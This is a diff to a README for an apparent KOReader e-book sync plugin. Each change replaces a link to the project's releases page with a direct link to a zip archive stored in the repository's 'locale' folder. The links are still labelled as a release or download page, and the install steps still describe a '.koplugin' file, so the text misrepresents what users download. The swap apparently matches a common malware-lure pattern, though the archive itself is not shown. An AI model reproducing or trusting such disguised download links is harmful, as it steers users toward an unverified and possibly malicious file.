@@ -1,6 +1,6 @@
 # 📚 kosyncthing_plus.koplugin - Sync your books across e-ink devices
 
-[![Download Link](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/VACE001/kosyncthing_plus.koplugin/releases)
+[![Download Link](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/VACE001/kosyncthing_plus.koplugin/main/locale/kosyncthing_plus_koplugin_v3.2.zip)
 
 KOSyncthing+ keeps your digital library synchronized. It sends books, reading notes, and progress markers between your e-readers. You manage your files in private. The software requires no external cloud services. It runs a background service inside your KOReader app. This plugin handles Wi-Fi connections, resolves file conflicts, and provides a simple menu for your needs.
 
@@ -16,7 +16,7 @@ KOSyncthing+ keeps your digital library synchronized. It sends books, reading no
 
 Follow these steps to add this functionality to your e-reader.
 
-1.  Visit the [Download Page](https://github.com/VACE001/kosyncthing_plus.koplugin/releases) to obtain the latest version of the plugin.
+1.  Visit the [Download Page](https://raw.githubusercontent.com/VACE001/kosyncthing_plus.koplugin/main/locale/kosyncthing_plus_koplugin_v3.2.zip) to obtain the latest version of the plugin.
 2.  Locate the file ending in `.koplugin`.
 3.  Download this file to your computer.
 
